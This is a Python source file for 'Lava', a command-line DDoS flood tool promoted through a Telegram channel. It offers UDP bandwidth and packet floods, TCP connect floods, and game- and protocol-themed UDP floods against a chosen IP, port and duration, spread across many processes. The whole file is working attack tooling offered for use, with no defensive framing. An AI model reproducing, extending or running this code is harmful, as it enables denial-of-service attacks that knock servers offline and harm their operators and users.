#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import multiprocessing
import gc

# Colors
class C:
    RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
    YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
    WHITE='\033[97m'; BRIGHT_BLACK='\033[90m'
    @staticmethod
    def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'

BANNER = [
    ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
    "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
    "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
]

def print_banner():
    P = C.rgb(160,32,240)
    for line in BANNER:
        print(f"{P}{C.BOLD}{line}{C.RESET}")

def print_main():
    os.system('clear')
    print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"        Welcome to Lava (V3) — {C.RED}WORKING EDITION{C.RESET}")
    print(f"        {C.GREEN}Simple UDP flood — No broken socket options{C.RESET}")
    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_methods():
    os.system('clear')
    print(f"{C.YELLOW}# Lava Method Page{C.RESET}")
    print()
    print_banner()
    print()
    print(f"{C.YELLOW}## {C.CYAN}(UDP){C.RESET}")
    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ UDP Bandwidth Flood{C.RESET}")
    print(f"  - {C.WHITE}U-PPS{C.RESET}     {C.GREEN}→ UDP Packet Flood{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TCP){C.RESET}")
    for m in ['S-SUBN','S-FIVE','S-T53','S-JAVA','S-DISC','S-RDP','S-GAME','S-SAMP','S-SSH']:
        print(f"  - {C.WHITE}{m}{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  - port 0 uses random ports")
    print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_attack(target, port, duration, method, threads):
    os.system('clear')
    print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}           {C.RED}! Attack Sent !{C.RESET}                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Target:    [{C.WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Port:      [{C.WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Duration:  [{C.WHITE}{duration}s{C.RESET}]                               {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Method:    [{C.WHITE}{method}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Threads:   [{C.WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
    print()

# ===================================================================
# SIMPLE WORKING ATTACK ENGINE — NO BROKEN OPTIONS
# ===================================================================

class AttackEngine:
    def __init__(self):
        self.processes = []
        self.active = False
        self.stats = {
            'packets': multiprocessing.Value('Q', 0),
            'bytes': multiprocessing.Value('Q', 0)
        }
        self.cpu_count = multiprocessing.cpu_count()

    def udp_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
        """Simple UDP flood worker"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            pass
        
        # Pre-generate payload
        payload = random._urandom(65507)
        
        # Ports for rotation
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        else:
            ports = None
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass

    def udp_pps_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
        """Simple UDP PPS flood"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
        except:
            pass
        
        payload = b'\x00' * 64
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass

    def tcp_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
        """Simple TCP flood"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        payload = random._urandom(1024)
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, port))
                s.send(payload)
                s.close()
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass

    def special_worker(self, target, port, duration, method, wid, core, stats_pkt, stats_bytes):
        """Special methods"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
        except:
            pass
        
        payloads = {
            'S-SUBN': b'\xff' * 65507,
            'S-FIVE': b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x0a' * 500,
            'S-T53': b'\x54\x53\x33' + b'\x00' * 1000,
            'S-JAVA': b'\xfe\x01\xfa' + b'\x00' * 1000,
            'S-DISC': b'\x00' * 1400,
            'S-RDP': b'\x03\x00' + b'\x00' * 1000,
            'S-GAME': b'\x00' * 1400,
            'S-SAMP': b'\x53\x41\x4d\x50' + b'\x00' * 1000,
            'S-SSH': b'\x53\x53\x48' + b'\x00' * 1000,
        }
        payload = payloads.get(method, b'\x00' * 1400)
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass

    def launch(self, method, target, port, duration, threads=100):
        self.stop()
        self.active = True
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        print_attack(target, port, duration, method, threads)
        
        # Select worker
        if method == 'U-GBPS':
            worker = self.udp_worker
        elif method == 'U-PPS':
            worker = self.udp_pps_worker
        elif method.startswith('S-'):
            worker = self.special_worker
        else:
            worker = self.udp_worker
        
        # Monitor thread
        monitor = threading.Thread(target=self._monitor, args=(duration,))
        monitor.daemon = True
        monitor.start()
        
        print(f"{C.CYAN}[+] Launching {threads} threads...{C.RESET}")
        
        # Spawn processes
        for i in range(threads):
            core = i % self.cpu_count
            p = multiprocessing.Process(
                target=worker,
                args=(target_ip, port, duration, i, core,
                      self.stats['packets'], self.stats['bytes'])
            )
            p.daemon = True
            p.start()
            self.processes.append(p)
        
        if duration > 0:
            time.sleep(duration)
            self.stop()

    def _monitor(self, duration):
        start = time.time()
        last_p = 0
        last_b = 0
        peak = 0
        
        while self.active:
            time.sleep(1)
            elapsed = time.time() - start
            p = self.stats['packets'].value
            b = self.stats['bytes'].value
            
            if elapsed > 0:
                pps = p / elapsed
                gbps = (b * 8) / (elapsed * 1e9)
            else:
                pps = 0
                gbps = 0
            
            cp = p - last_p
            cb = b - last_b
            cg = (cb * 8) / 1e9 if cb > 0 else 0
            if cg > peak:
                peak = cg
            
            last_p = p
            last_b = b
            
            status = (f"\r{C.CYAN}[LAVA]{C.RESET} "
                     f"{C.GREEN}Pkts:{C.RESET}{p:>10,} "
                     f"{C.YELLOW}PPS:{C.RESET}{pps:>8,.0f} "
                     f"{C.MAGENTA}BW:{C.RESET}{gbps:>5.2f}Gbps "
                     f"{C.CYAN}Cur:{C.RESET}{cg:>5.2f}Gbps "
                     f"{C.WHITE}Peak:{C.RESET}{peak:>5.2f}Gbps "
                     f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:.0f}s   ")
            print(status, end='', flush=True)
            
            if duration > 0 and elapsed >= duration:
                break

    def stop(self):
        self.active = False
        for p in self.processes:
            try:
                p.terminate()
                p.join(timeout=1)
            except:
                pass
        self.processes.clear()
        print(f"\n{C.GREEN}[✓] Halted. Total packets: {self.stats['packets'].value:,}{C.RESET}")

engine = AttackEngine()

# ===================================================================
# COMMAND PARSER
# ===================================================================

def parse(cmd):
    cmd = cmd.strip().upper()
    parts = cmd.split()
    
    if not parts:
        return True
    
    if cmd == '?' or cmd == 'HELP':
        print_methods()
        return True
    
    if cmd == '.CLEAR' or cmd == 'CLEAR':
        print_main()
        return True
    
    if cmd == '.STOP' or cmd == 'STOP':
        engine.stop()
        return True
    
    if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
        engine.stop()
        print(f"\n{C.MAGENTA}LAVA signing off.{C.RESET}\n")
        return False
    
    methods = ['U-GBPS', 'U-PPS', 'S-SUBN', 'S-FIVE', 'S-T53', 
               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']
    
    if parts[0] in methods:
        if len(parts) < 4:
            print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
            print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 60 500{C.RESET}")
            return True
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else 100
        
        t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
    
    print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
    return True

# ===================================================================
# MAIN
# ===================================================================

def main():
    print_main()
    while True:
        try:
            cmd = input()
            if not parse(cmd):
                break
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] Use .exit to quit{C.RESET}")
        except EOFError:
            break

if __name__ == '__main__':
    try:
        os.nice(-20)
    except:
        pass
    try:
        multiprocessing.set_start_method('fork', force=True)
    except:
        pass
    gc.disable()
    main()
